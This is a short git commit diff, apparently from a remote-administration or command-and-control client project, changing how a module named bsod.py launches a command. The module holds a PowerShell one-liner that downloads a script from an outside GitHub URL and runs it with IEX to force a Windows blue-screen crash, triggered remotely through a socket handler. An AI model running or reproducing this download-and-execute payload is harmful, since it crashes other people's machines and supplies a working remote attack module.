a8567ea65a4cc04505e520ac244cf2a41abe3d52
Obvious Plays <111094267+ObviousTeam@users.noreply.github.com>
2024-09-20 18:58:34 -0400

    switched to Popen

--- templates/client/pem/bsod.py
+++ templates/client/pem/bsod.py
@@ -4,4 +4,4 @@ import os
 def run(sio, uuid):
     if os.name == "nt":
         powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
-        result = subprocess.run(powershell_command)
+        result = subprocess.Popen(powershell_command)
